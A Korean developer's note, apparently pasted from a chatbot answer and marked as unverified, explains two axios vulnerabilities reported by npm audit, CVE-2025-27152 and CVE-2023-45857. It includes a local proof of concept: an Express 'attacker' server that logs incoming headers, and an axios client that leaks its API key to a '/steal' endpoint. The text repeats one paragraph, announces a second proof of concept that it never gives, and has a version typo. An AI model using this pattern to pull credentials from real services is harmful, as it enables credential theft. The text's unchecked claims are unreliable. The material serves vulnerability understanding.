TODO : 검증한번 필요.

axios 1.18버전에서 어떤 취약점이 발견됬지? npm install axios하니까 2 high serverity vulnerabilities가 떴거든

axios 1.8.x 근처에서 뜨는 대표 High 취약점은 보통 이겁니다.

CVE-2025-27152
Axios가 baseURL을 써도, 요청 URL에 절대경로가 들어오면 의도하지 않은 외부 주소로 요청이 나가면서 SSRF / 인증정보 유출 가능성이 생긴 취약점입니다. axios 1.0.0 ~ 1.8.1이 영향권이고, 1.8.2에서 수정된 것으로 보고됩니다.

그리고 npm audit에서 2개 High로 뜬다면, 추가로 이런 계열일 가능성이 큽니다.

CVE-2023-45857
Axios의 XSRF 토큰 관련 취약점입니다. 오래된 버전 범위까지 같이 걸려서 audit에 함께 표시되는 경우가 있습니다

CVE-2023-45857
Axios의 XSRF 토큰 관련 취약점입니다. 오래된 버전 범위까지 같이 걸려서 audit에 함께 표시되는 경우가 있습니다

1. CVE-2025-27152 PoC

취약점 요지: baseURL을 설정했는데도, 요청값에 절대 URL이 들어가면 baseURL이 무시되고 그 절대 URL로 요청이 나갈 수 있습니다. Axios 1.8.2에서 수정된 것으로 공지되어 있습니다.

2. CVE-2023-45857 PoC

취약점 요지: Axios 1.5.1에서 XSRF-TOKEN 쿠키값이 X-XSRF-TOKEN 헤더로 다른 호스트 요청에도 포함될 수 있는 정보 노출 문제입니다.

브라우저 환경에서 보는 게 맞습니다.

mkdir axios-poc
cd axios-poc
npm init -y
npm i axios@1.8.1 express

const express = require("express");
const axios = require("axios");

const attacker = express();
attacker.use(express.json());

attacker.all("*", (req, res) => {
  console.log("=== attacker server received ===");
  console.log("method:", req.method);
  console.log("url:", req.url);
  console.log("headers:", req.headers);
  res.json({ ok: true, server: "attacker" });
});

attacker.listen(4000, () => {
  console.log("attacker server: http://localhost:4000");
});

async function run() {
  const client = axios.create({
    baseURL: "http://localhost:3000/api",
    headers: {
      "X-API-KEY": "SECRET_TEST_KEY",
    },
  });

  await client.get("http://localhost:4000/steal");
}

setTimeout(run, 500);

[참조]
https://discourse.mcneel.com/t/npm-issue-for-javascript-sdk-axios-security-vulnerability/205978?utm_source=chatgpt.com


https://discourse.mcneel.com/t/npm-issue-for-javascript-sdk-axios-security-vulnerability/205978?utm_source=chatgpt.com
